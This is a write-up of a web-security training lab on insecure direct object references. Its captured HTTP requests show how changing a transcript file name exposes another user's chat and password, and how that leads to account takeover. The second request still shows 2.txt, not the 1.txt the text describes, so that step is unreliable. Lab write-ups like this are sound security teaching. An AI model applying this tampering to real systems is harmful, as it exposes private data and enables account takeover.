## Insecure direct object references

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account.

## Notes

- /resources/js/viewTranscript.js
- /chat
- /login

## Resume

1. Login with wiener:peter
2. Capture a **View transcription** request on `/chat`
3. Update the **View transcription** request
4. Login with Carlos's accout

## Solve 

Login with wiener:peter and access to the chat endpoint. Capture the **View transcription** request : 

```
GET /download-transcript/2.txt HTTP/2
Host: 0a8400850381429783e4966300bf0007.web-security-academy.net
Cookie: session=aOBcxWQn2jONQ1GBPzASu7lDF5OzcUTI
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8400850381429783e4966300bf0007.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Update the request an try to access `1.txt` :

```
GET /download-transcript/2.txt HTTP/2
Host: 0a8400850381429783e4966300bf0007.web-security-academy.net
Cookie: session=aOBcxWQn2jONQ1GBPzASu7lDF5OzcUTI
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8400850381429783e4966300bf0007.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The answer : 

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is q3mqfgfh01vkpe3tu8gg. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

Login with Carlos's account